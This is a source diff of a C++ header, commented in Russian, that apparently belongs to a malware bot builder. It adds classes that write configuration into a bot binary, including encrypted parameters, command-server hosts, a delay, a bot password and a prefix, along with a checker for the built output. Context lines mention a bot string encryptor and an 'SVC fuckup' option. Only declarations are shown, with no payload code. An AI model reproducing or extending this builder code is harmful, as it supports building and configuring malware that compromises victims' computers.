@@ -69,7 +69,10 @@ PCHAR Param_SVCFuckupEnabled = "__SVC_FUCKUP_ENABLED__";
 
 
 // Версия сборщика
-#define BUILDER_VERSION 1
+#define BUILDER_VERSION 1.3
+
+
+class TCustomBotModule;
 
 
 
@@ -84,6 +87,154 @@ class TBotStringsEncryptor;
 enum TBotParamStatus {psOk, psWarning, psError};
 
 typedef void __fastcall (__closure *TBuilderMessage)(TBotBuilder *Sender, const UnicodeString &Message);
+
+
+
+//*****************************************************************
+//  Класс базового параметров бота
+//*****************************************************************
+class TCustomParam : public TObject
+{
+private:
+	TCustomBotModule* FOwner;
+	AnsiString FName;
+	UnicodeString FTitle;
+
+	DWORD  FSize;      // Разммер буфера
+	LPBYTE FData;      // Буфер данных
+	bool   FEncrypted; // Признак шифрованных данных
+	bool   FNotNull;   // Парметр не может быть нулевым
+    bool   FEnabled;   // Признак доступности параметра
+
+    DWORD FDataSize;   // Размер записанных данных
+    int   FPosition;   // Позиция параметра ф буфере
+
+	friend class TCustomBotModule;
+
+	void Clear();
+	void ResetStatus();
+	bool UpdateStatus(LPBYTE Buf, DWORD BufSize);
+
+	AnsiString GetAsMultiLine();
+	void	   SetAsMultiLine(const AnsiString& Value);
+protected:
+	void SetValue(LPVOID Data, DWORD Size, bool Encrypt);
+
+	AnsiString virtual GetAsString();
+	void       virtual SetAsString(const AnsiString& Value);
+
+	bool Write(LPBYTE Buf, DWORD BufSize);
+public:
+	TCustomParam(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title);
+	__fastcall ~TCustomParam();
+
+
+    bool CheckParam(LPBYTE Buf);
+
+	__property AnsiString Name = {read=FName};
+	__property DWORD Size = {read=FSize};
+	__property bool Enabled = {read=FEnabled, write=FEnabled};
+	__property bool Encrypted = {read=FEncrypted};
+	__property AnsiString AsString    = {read=GetAsString, write=SetAsString};
+	__property AnsiString AsMultiLine = {read=GetAsMultiLine, write=SetAsMultiLine};
+
+    __property int Position = {read=FPosition};
+};
+
+
+
+//*****************************************************************
+//  Класс основного пароля бота
+//*****************************************************************
+class TCustomPassword : public TCustomParam
+{
+private:
+    AnsiString FPassword;
+protected:
+	AnsiString GetAsString();
+	void       SetAsString(const AnsiString& Value);
+public:
+	TCustomPassword(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title);
+	__fastcall ~TCustomPassword();
+};
+
+
+
+//*****************************************************************
+//  Класс базового модуля параметров бота
+//*****************************************************************
+class TCustomBotModule : public TComponent
+{
+private:
+	TList* FItems;
+
+	friend class TCustomParam;
+
+	void Clear();
+	int  GetCount();
+	bool GetActive();
+
+	TCustomParam* GetItems(int Index);
+protected:
+	void virtual InsertItem(TCustomParam* Param);
+	void virtual RemoveItem(TCustomParam* Param);
+
+	void ResetParamsStatus();
+	bool UpdateParamsStatus(const char* FileName);
+	bool WriteParams(LPBYTE Buf, DWORD BufSize);
+public:
+	__fastcall TCustomBotModule(TComponent* AOwner);
+	__fastcall ~TCustomBotModule();
+
+	TCustomParam* GetParamForPos(int Position);
+
+	__property bool Active = {read=GetActive};
+	__property int  Count = {read=GetCount};
+	__property TCustomParam* Items[int Index] = {read=GetItems};
+};
+
+
+
+
+//*****************************************************************
+//  Модуль базовых настроек бота
+//*****************************************************************
+class TBaseBotModule : public TCustomBotModule
+{
+private:
+	// Базовые параметры сборки
+	TCustomParam* FPrefix;
+	TCustomParam* FHosts;
+	TCustomParam* FDelay;
+	TCustomParam* FPassword;
+
+	UnicodeString FFileName;
+
+	UnicodeString GetResultFileName();
+public:
+	__fastcall TBaseBotModule(TComponent* AOwner);
+	__fastcall ~TBaseBotModule();
+
+	bool Open(const UnicodeString &FileName);
+	bool Close();
+
+	bool Buld();
+
+
+	__property UnicodeString FileName = {read=FFileName};
+	__property UnicodeString ResultFileName = {read=GetResultFileName};
+
+	__property TCustomParam* Prefix   = {read=FPrefix};
+	__property TCustomParam* Hosts    = {read=FHosts};
+	__property TCustomParam* Delay    = {read=FDelay};
+	__property TCustomParam* Password = {read=FPassword};
+};
+
+
+
+
+
+
 
 
 //*************************************************************
@@ -302,6 +453,30 @@ public:
 	bool __fastcall virtual Execute(TBotModule *Module) = 0;
 };
 
+
+
+//*************************************************************
+//   TBuildChecker  - Класс проверки результата сборки
+//*************************************************************
+class TBuildChecker : public TComponent
+{
+private:
+	UnicodeString FSourceFile;
+	UnicodeString FResultFile;
+	LPBYTE FSourceBuf;
+	LPBYTE FResultBuf;
+	DWORD FSourceSize;
+	DWORD FResultSize;
+	TBaseBotModule* FModule;
+public:
+	__fastcall  TBuildChecker(TComponent* AOwner, TBaseBotModule* AModule);
+	__fastcall  ~TBuildChecker();
+
+	bool OpenFiles(const UnicodeString& SourceFile, const UnicodeString& ResultFile);
+	bool CompareBuffers(LPBYTE Source, DWORD SourceSize, LPBYTE Result, DWORD ResultSize);
+
+	bool Check();
+};
 
 
 
